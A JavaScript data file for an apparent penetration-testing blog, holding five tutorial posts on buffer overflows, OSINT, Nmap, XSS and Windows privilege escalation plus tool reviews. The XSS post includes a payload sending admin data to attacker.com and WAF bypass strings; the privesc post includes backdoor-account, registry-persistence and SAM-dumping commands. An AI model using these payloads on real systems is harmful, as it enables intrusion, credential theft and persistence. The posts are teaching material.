export const blogPosts = [
  {
    id: 1,
    title: "Buffer Overflow Exploitation in Legacy Applications",
    date: "2024-01-15",
    lastUpdated: "2024-01-16",
    tags: ["Buffer Overflow", "Exploitation", "Binary Analysis"],
    excerpt: "Deep dive into exploiting buffer overflow vulnerabilities in legacy C applications. We'll cover stack-based overflows, shellcode injection, and bypass techniques.",
    content: `# Buffer Overflow Exploitation in Legacy Applications

## Introduction

Buffer overflow vulnerabilities remain one of the most critical security issues in software development. In this writeup, we'll explore how to identify and exploit buffer overflow vulnerabilities in legacy C applications.

## Vulnerability Analysis

\`\`\`c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // Dangerous!
    printf("Input: %s\\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <input>\\n", argv[0]);
        return 1;
    }
    vulnerable_function(argv[1]);
    return 0;
}
\`\`\`

The vulnerability lies in the use of \`strcpy()\` without bounds checking.

## Exploitation Steps

1. **Identify the buffer size**: 64 bytes
2. **Find the return address offset**: Use pattern_create.rb
3. **Craft the payload**: Overflow + Return address + Shellcode
4. **Execute the exploit**

## Tools Used

- **GDB**: For debugging and analysis
- **objdump**: To analyze the binary
- **pwntools**: For exploit development

## Mitigation

- Use safe string functions like \`strncpy()\`
- Enable stack canaries (\`-fstack-protector\`)
- Implement ASLR and NX bit
- Regular code audits and static analysis

## Conclusion

Buffer overflows are preventable with proper coding practices and modern compiler protections.`,
    author: "Gulmmdoff",
    readTime: 8
  },
  {
    id: 2,
    title: "OSINT Investigation: Tracking Digital Footprints",
    date: "2024-01-10",
    lastUpdated: "2024-01-12",
    tags: ["OSINT", "Investigation", "Social Engineering"],
    excerpt: "Complete guide to Open Source Intelligence gathering techniques for penetration testing and digital investigations.",
    content: `# OSINT Investigation: Tracking Digital Footprints

## Overview

Open Source Intelligence (OSINT) is the collection and analysis of information from publicly available sources. This guide covers practical OSINT techniques for penetration testers.

## Information Gathering Framework

### 1. Target Identification
- Domain enumeration
- Subdomain discovery
- Email harvesting
- Social media profiling

### 2. Technical Reconnaissance
\`\`\`bash
# DNS enumeration
dig example.com any
nslookup -type=mx example.com

# Subdomain discovery
sublist3r -d example.com
amass enum -d example.com

# Certificate transparency
curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value'
\`\`\`

### 3. Social Media Intelligence
- LinkedIn employee enumeration
- GitHub repository analysis
- Twitter sentiment analysis
- Facebook graph searching

## Essential OSINT Tools

| Tool | Purpose | Command Example |
|------|---------|----------------|
| theHarvester | Email enumeration | \`theHarvester -d example.com -b google\` |
| Shodan | Internet-connected device search | \`shodan search "example.com"\` |
| Maltego | Link analysis | GUI-based investigation |
| Recon-ng | Framework for reconnaissance | \`recon-ng\` |

## Advanced Techniques

### Google Dorking
\`\`\`
site:example.com filetype:pdf
intitle:"index of" site:example.com
"example.com" inurl:admin
\`\`\`

### Metadata Analysis
- EXIF data extraction from images
- Document metadata examination
- Geolocation data harvesting

## Ethical Considerations

⚠️ **Important**: Always ensure you have proper authorization before conducting OSINT investigations. Respect privacy and follow legal guidelines.

## Conclusion

OSINT is a powerful technique that can reveal significant information about targets. Always use these techniques responsibly and within legal boundaries.`,
    author: "Gulmmdoff",
    readTime: 12
  },
  {
    id: 3,
    title: "Nmap Mastery: Advanced Network Scanning Techniques",
    date: "2024-01-05",
    lastUpdated: "2024-01-06",
    tags: ["Nmap", "Network Scanning", "Reconnaissance"],
    excerpt: "Master advanced Nmap techniques for effective network reconnaissance and vulnerability assessment.",
    content: `# Nmap Mastery: Advanced Network Scanning Techniques

## Introduction

Nmap (Network Mapper) is the de facto standard for network discovery and security auditing. This guide covers advanced techniques beyond basic port scanning.

## Advanced Scanning Techniques

### Stealth Scanning
\`\`\`bash
# SYN stealth scan
nmap -sS target.com

# NULL scan (bypasses some firewalls)
nmap -sN target.com

# FIN scan
nmap -sF target.com

# Xmas scan
nmap -sX target.com
\`\`\`

### Service and Version Detection
\`\`\`bash
# Aggressive service detection
nmap -sV --version-intensity 9 target.com

# OS detection
nmap -O target.com

# Comprehensive scan
nmap -A target.com
\`\`\`

### NSE Scripts

Nmap Scripting Engine (NSE) provides powerful automation:

\`\`\`bash
# Vulnerability scanning
nmap --script vuln target.com

# HTTP enumeration
nmap --script http-enum target.com

# SMB enumeration
nmap --script smb-enum-shares target.com

# Custom script execution
nmap --script="http-*" target.com
\`\`\`

## Evasion Techniques

### Timing and Performance
\`\`\`bash
# Paranoid timing (very slow)
nmap -T0 target.com

# Polite timing
nmap -T2 target.com

# Aggressive timing
nmap -T4 target.com

# Insane timing (fast but unreliable)
nmap -T5 target.com
\`\`\`

### Firewall Evasion
\`\`\`bash
# Fragment packets
nmap -f target.com

# Decoy scanning
nmap -D RND:10 target.com

# Source port spoofing
nmap --source-port 53 target.com

# Idle zombie scan
nmap -sI zombie.com target.com
\`\`\`

## Output Formats

\`\`\`bash
# XML output for parsing
nmap -oX scan_results.xml target.com

# Grepable output
nmap -oG scan_results.gnmap target.com

# All formats
nmap -oA scan_results target.com
\`\`\`

## Real-World Examples

### Network Discovery
\`\`\`bash
# Ping sweep
nmap -sn 192.168.1.0/24

# ARP scan (local network)
nmap -PR 192.168.1.0/24

# TCP SYN ping
nmap -PS22,80,443 192.168.1.0/24
\`\`\`

### Web Application Testing
\`\`\`bash
# HTTP methods enumeration
nmap --script http-methods target.com

# Directory traversal
nmap --script http-passwd target.com

# SQL injection detection
nmap --script http-sql-injection target.com
\`\`\`

## Best Practices

1. **Always get permission** before scanning networks
2. **Use appropriate timing** to avoid detection
3. **Combine multiple techniques** for comprehensive results
4. **Document findings** thoroughly
5. **Respect rate limits** and system resources

## Conclusion

Nmap is an incredibly powerful tool with endless possibilities. Master these techniques to become more effective in your security assessments.`,
    author: "Gulmmdoff",
    readTime: 15
  },
  {
    id: 4,
    title: "XSS Attack Vectors and Modern Bypasses",
    date: "2024-01-01",
    lastUpdated: "2024-01-02",
    tags: ["XSS", "Web Security", "JavaScript"],
    excerpt: "Comprehensive guide to Cross-Site Scripting attacks, including modern bypass techniques for WAFs and filters.",
    content: `# XSS Attack Vectors and Modern Bypasses

## Introduction

Cross-Site Scripting (XSS) remains one of the most prevalent web vulnerabilities. This guide explores various XSS vectors and modern bypass techniques.

## Types of XSS

### Reflected XSS
Occurs when user input is immediately returned in the response without proper sanitization.

\`\`\`html
<!-- Vulnerable code -->
<p>Hello <?php echo $_GET['name']; ?>!</p>

<!-- Attack payload -->
http://example.com/page.php?name=<script>alert('XSS')</script>
\`\`\`

### Stored XSS
Malicious scripts are stored on the server and executed when other users view the content.

\`\`\`javascript
// Stored in database
<script>
  fetch('/admin/users').then(r => r.text()).then(data => {
    fetch('http://attacker.com/steal?data=' + btoa(data));
  });
</script>
\`\`\`

### DOM-based XSS
Occurs when client-side JavaScript processes user input insecurely.

\`\`\`javascript
// Vulnerable code
document.getElementById('output').innerHTML = location.hash.substr(1);

// Attack URL
http://example.com/page.html#<img src=x onerror=alert('XSS')>
\`\`\`

## Modern Bypass Techniques

### HTML Entity Encoding Bypass
\`\`\`javascript
// Using HTML entities
&#60;script&#62;alert('XSS')&#60;/script&#62;

// Unicode encoding
\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e
\`\`\`

### Event Handler Bypass
\`\`\`html
<!-- When script tags are filtered -->
<img src=x onerror="alert('XSS')">
<body onload="alert('XSS')">
<svg onload="alert('XSS')">
<details open ontoggle="alert('XSS')">
\`\`\`

### CSS-based XSS
\`\`\`css
/* CSS injection leading to XSS */
body {
  background: url('javascript:alert("XSS")');
}

/* Modern CSS XSS */
@import 'data:text/css;base64,Ym9keXtiYWNrZ3JvdW5kOnVybCgiamF2YXNjcmlwdDphbGVydCgnWFNTJykiKX0=';
\`\`\`

### WAF Bypass Techniques

#### Filter Evasion
\`\`\`javascript
// Case variation
<ScRiPt>alert('XSS')</ScRiPt>

// Comment insertion
<script>/**/alert('XSS')/**/<//script>

// Whitespace manipulation
<script     >alert('XSS')</script>

// Null byte insertion
<script%00>alert('XSS')</script>
\`\`\`

#### Advanced Payloads
\`\`\`javascript
// Template literals
<script>\`alert\`('XSS')</script>

// Constructor method
<script>[].constructor.constructor('alert("XSS")')();</script>

// String.fromCharCode
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
\`\`\`

## Content Security Policy (CSP) Bypass

### CSP Header Analysis
\`\`\`http
Content-Security-Policy: default-src 'self'; script-src 'unsafe-inline'
\`\`\`

### Bypass Techniques
\`\`\`javascript
// JSONP callback bypass
<script src="//api.example.com/data?callback=alert"></script>

// Base tag injection
<base href="//attacker.com/">
<script src="/malicious.js"></script>

// Meta refresh bypass
<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
\`\`\`

## Detection and Testing

### Manual Testing
\`\`\`javascript
// Basic payload
<script>alert('XSS')</script>

// Polyglot payload
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
\`\`\`

### Automated Tools
- **XSSer**: Automated XSS testing
- **XSStrike**: Advanced XSS detection
- **Burp Suite**: Web application testing
- **OWASP ZAP**: Security testing proxy

## Prevention Techniques

### Input Validation
\`\`\`php
// Whitelist approach
function sanitizeInput($input) {
    return preg_replace('/[^a-zA-Z0-9\\s]/', '', $input);
}
\`\`\`

### Output Encoding
\`\`\`php
// HTML encoding
echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');

// JavaScript encoding
echo json_encode($userInput, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP);
\`\`\`

### Content Security Policy
\`\`\`http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-randomvalue'
\`\`\`

## Conclusion

XSS vulnerabilities continue to evolve with new bypass techniques. Regular security testing and proper input/output handling are essential for prevention.`,
    author: "Gulmmdoff",
    readTime: 18
  },
  {
    id: 5,
    title: "Privilege Escalation in Windows Environments",
    date: "2023-12-20",
    lastUpdated: "2023-12-21",
    tags: ["Windows", "Privilege Escalation", "PowerShell"],
    excerpt: "Techniques and tools for escalating privileges in Windows environments during penetration testing.",
    content: `# Privilege Escalation in Windows Environments

## Introduction

Privilege escalation is a critical phase in Windows penetration testing. This guide covers various techniques to elevate privileges from standard user to administrator or SYSTEM.

## Enumeration Phase

### System Information Gathering
\`\`\`powershell
# System information
systeminfo
whoami /all
net user %username%

# Network information
ipconfig /all
netstat -ano
arp -a

# Process enumeration
tasklist /svc
wmic process list full
\`\`\`

### Service Enumeration
\`\`\`powershell
# List all services
sc query
wmic service list full

# Check service permissions
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -qwcv "Everyone" *
\`\`\`

## Common Escalation Vectors

### Unquoted Service Paths
\`\`\`powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\" | findstr /i /v """

# Exploit example
# If service path is: C:\\Program Files\\Vulnerable App\\service.exe
# Place malicious exe at: C:\\Program.exe
\`\`\`

### Weak Service Permissions
\`\`\`powershell
# Check service permissions with accesschk
accesschk.exe -uwcqv "service_name"

# Modify service binary path
sc config "service_name" binpath= "cmd.exe /k net localgroup administrators user /add"
sc start "service_name"
\`\`\`

### DLL Hijacking
\`\`\`powershell
# Find DLL hijacking opportunities
listdlls -r
procmon.exe (Monitor file access)

# Check for missing DLLs
sigcheck -m -v -s c:\\windows\\system32\\*.dll
\`\`\`

## Token Manipulation

### SeImpersonatePrivilege
\`\`\`powershell
# Check for SeImpersonatePrivilege
whoami /priv

# Exploit with JuicyPotato
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c net localgroup administrators user /add" -t *
\`\`\`

### SeBackupPrivilege
\`\`\`powershell
# Abuse SeBackupPrivilege
reg save hklm\\sam c:\\sam
reg save hklm\\system c:\\system
reg save hklm\\security c:\\security

# Extract hashes
secretsdump.py -sam sam -system system LOCAL
\`\`\`

## Registry Exploitation

### Always Install Elevated
\`\`\`powershell
# Check registry keys
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\

# Create malicious MSI
msfvenom -p windows/adduser USER=backdoor PASS=password123 -f msi -o malicious.msi
msiexec /quiet /qn /i malicious.msi
\`\`\`

### AutoRuns
\`\`\`powershell
# Check startup locations
reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run

# Registry modification
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Backdoor" /t REG_SZ /d "C:\\backdoor.exe"
\`\`\`

## PowerShell Techniques

### PowerUp
\`\`\`powershell
# Import PowerUp
Import-Module PowerUp.ps1

# Run all checks
Invoke-AllChecks

# Abuse service issues
Invoke-ServiceAbuse -Name "VulnService"
\`\`\`

### SharpUp
\`\`\`powershell
# Compiled version of PowerUp
SharpUp.exe audit

# Specific checks
SharpUp.exe audit ModifiableServices
SharpUp.exe audit UnquotedServicePaths
\`\`\`

## Kernel Exploits

### Exploit Suggester
\`\`\`powershell
# Windows Exploit Suggester
python windows-exploit-suggester.py --database 2021-05-15-mssb.xls --systeminfo systeminfo.txt

# Sherlock (PowerShell)
Import-Module Sherlock.ps1
Find-AllVulns
\`\`\`

### Common Kernel Exploits
- **MS16-032**: Secondary Logon Handle
- **MS16-135**: Win32k Elevation of Privilege
- **MS17-017**: Win32k Elevation of Privilege
- **CVE-2020-0787**: Windows Background Intelligent Transfer Service

## Group Policy Preferences

### Finding GPP Files
\`\`\`powershell
# Search for Groups.xml
findstr /S /I cpassword \\\\domain.com\\sysvol\\domain.com\\policies\\*.xml

# Decrypt cpassword
gpp-decrypt "encrypted_password"
\`\`\`

## Automated Tools

### WinPEAS
\`\`\`powershell
# Download and run WinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.exe -o winPEAS.exe
winPEAS.exe
\`\`\`

### PrivescCheck
\`\`\`powershell
# PowerShell privilege escalation checker
Import-Module PrivescCheck.ps1
Invoke-PrivescCheck
\`\`\`

## Prevention and Hardening

### Security Configurations
- Enable ASLR and DEP
- Configure proper service permissions
- Regular patching schedule
- Implement least privilege principle
- Monitor for unusual process execution

### PowerShell Logging
\`\`\`powershell
# Enable PowerShell logging
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 1
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1
\`\`\`

## Conclusion

Windows privilege escalation requires systematic enumeration and exploitation of misconfigurations. Regular security assessments and proper hardening are essential for prevention.`,
    author: "Gulmmdoff",
    readTime: 20
  }
];

export const tools = [
  {
    id: 1,
    name: "Nmap",
    category: "Network Scanning",
    description: "Network discovery and security auditing tool",
    rating: 5,
    pros: ["Comprehensive scanning options", "NSE scripts", "Cross-platform"],
    cons: ["Can be noisy", "Learning curve for advanced features"],
    useCase: "Network reconnaissance and port scanning"
  },
  {
    id: 2,
    name: "Burp Suite",
    category: "Web Application Testing",
    description: "Integrated platform for web application security testing",
    rating: 5,
    pros: ["Excellent proxy", "Comprehensive scanner", "Extensible"],
    cons: ["Expensive Professional version", "Resource intensive"],
    useCase: "Web application penetration testing"
  },
  {
    id: 3,
    name: "Metasploit",
    category: "Exploitation Framework",
    description: "Penetration testing framework with extensive exploit database",
    rating: 4,
    pros: ["Large exploit database", "Easy payload generation", "Well documented"],
    cons: ["Can be detected easily", "Requires regular updates"],
    useCase: "Vulnerability exploitation and payload delivery"
  },
  {
    id: 4,
    name: "Wireshark",
    category: "Network Analysis",
    description: "Network protocol analyzer for troubleshooting and analysis",
    rating: 5,
    pros: ["Deep packet inspection", "Rich filtering", "Open source"],
    cons: ["Overwhelming for beginners", "Large capture files"],
    useCase: "Network traffic analysis and protocol debugging"
  },
  {
    id: 5,
    name: "John the Ripper",
    category: "Password Cracking",
    description: "Fast password cracker with support for many hash types",
    rating: 4,
    pros: ["Fast cracking speed", "Multiple hash formats", "Community rules"],
    cons: ["Command-line only", "Requires good wordlists"],
    useCase: "Password hash cracking and strength testing"
  },
  {
    id: 6,
    name: "Gobuster",
    category: "Directory Enumeration",
    description: "Fast directory/file & DNS busting tool written in Go",
    rating: 4,
    pros: ["Very fast", "Multiple modes", "Simple to use"],
    cons: ["Limited features", "Requires good wordlists"],
    useCase: "Web directory and subdomain enumeration"
  }
];

export const getPostById = (id) => {
  return blogPosts.find(post => post.id === parseInt(id));
};

export const getPostsByTag = (tag) => {
  return blogPosts.filter(post => 
    post.tags.some(postTag => 
      postTag.toLowerCase().includes(tag.toLowerCase())
    )
  );
};

export const searchPosts = (query) => {
  const searchTerm = query.toLowerCase();
  return blogPosts.filter(post => 
    post.title.toLowerCase().includes(searchTerm) ||
    post.excerpt.toLowerCase().includes(searchTerm) ||
    post.tags.some(tag => tag.toLowerCase().includes(searchTerm)) ||
    post.content.toLowerCase().includes(searchTerm)
  );
};